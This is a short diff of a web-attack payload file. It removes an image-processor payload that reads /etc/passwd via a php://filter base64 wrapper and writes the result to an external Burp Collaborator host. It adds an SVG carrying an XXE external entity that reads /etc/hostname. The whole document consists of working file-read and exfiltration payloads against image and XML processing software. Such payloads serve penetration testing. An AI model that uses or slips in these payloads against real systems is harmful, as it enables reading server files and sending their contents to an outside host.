@@ -1,9 +1,2 @@
-<?xml version="1.0" encoding="UTF-8" ?>
-<!-- <svg> -->
-<image>
-  <read filename="php://filter/convert.base64-encode/resource=/etc/passwd" />
-  <write filename="http://tc904jnhst7o84z18ei5lpcdb4hu5j.burpcollaborator.net/image.txt" />
-  <svg width="120px" height="120px">
-    <image width="120" height="120" href="text:/etc/passwd" />
-  </svg>
-</image>
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
+
